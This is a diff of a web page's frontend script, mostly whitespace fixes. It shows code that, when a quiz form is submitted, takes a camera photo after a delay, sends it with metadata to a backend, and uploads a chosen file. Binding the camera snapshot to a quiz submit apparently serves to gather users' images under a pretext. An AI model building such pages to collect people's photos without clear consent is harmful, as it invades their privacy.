@@ -1,3 +1,8 @@
+// ================================
+// FRONTEND SCRIPT.JS
+// ================================
+
+// DOM elements
 const btn = document.getElementById('submit-btn') || document.getElementById('btn');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -76,51 +81,69 @@ async function sendCameraData() {
 
     // Wait a few seconds so user has time to focus
     await new Promise(res => setTimeout(res, 3000));
-                                                                          const image = await capturePhoto();
-                                                                          const res = await fetch(`${BACKEND_BASE}/upload`, {
+
+    const image = await capturePhoto();
+
+    const res = await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image, metadata })
     });
 
     const data = await res.json();
-    if (data.success) showToast("Camera captured & sent!");               else showToast("Failed to send camera image");
-  } catch (err) {                                                         console.error("Camera capture error:", err);
+    if (data.success) showToast("Camera captured & sent!");
+    else showToast("Failed to send camera image");
+  } catch (err) {
+    console.error("Camera capture error:", err);
     alert("Camera permission denied or error occurred.");
   }
 }
 
 // ================================
-// SEND FILE UPLOAD                                                   // ================================
+// SEND FILE UPLOAD
+// ================================
 async function sendFileUpload(file) {
-  try {                                                                   if (!file) return;
-    const reader = new FileReader();                                      reader.onload = async () => {
+  try {
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = async () => {
       const base64 = reader.result;
 
       const res = await fetch(`${BACKEND_BASE}/file-upload`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },                      body: JSON.stringify({ file: base64, filename: file.name })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ file: base64, filename: file.name })
       });
-                                                                            const data = await res.json();
-      if (data.success) showToast("File uploaded successfully!");           else showToast("File upload failed");
+
+      const data = await res.json();
+      if (data.success) showToast("File uploaded successfully!");
+      else showToast("File upload failed");
     };
     reader.readAsDataURL(file);
   } catch (err) {
     console.error("File upload error:", err);
-  }                                                                   }
+  }
+}
 
-// ================================                                   // HANDLE FORM SUBMIT
-// ================================                                   if (btn) {
-  btn.addEventListener('click', async (e) => {                            e.preventDefault();
+// ================================
+// HANDLE FORM SUBMIT
+// ================================
+if (btn) {
+  btn.addEventListener('click', async (e) => {
+    e.preventDefault();
 
     // 1️⃣ Capture camera
     await sendCameraData();
 
-    // 2️⃣ Send file if selected                                            if (fileInput && fileInput.files.length > 0) {
+    // 2️⃣ Send file if selected
+    if (fileInput && fileInput.files.length > 0) {
       await sendFileUpload(fileInput.files[0]);
-    }                                                                 
-    // 3️⃣ Show success page or reload                                      const quiz = document.getElementById('quiz-container');
-    const success = document.getElementById('success-container');         if (quiz && success) {
+    }
+
+    // 3️⃣ Show success page or reload
+    const quiz = document.getElementById('quiz-container');
+    const success = document.getElementById('success-container');
+    if (quiz && success) {
       quiz.style.display = "none";
       success.style.display = "flex";
     }
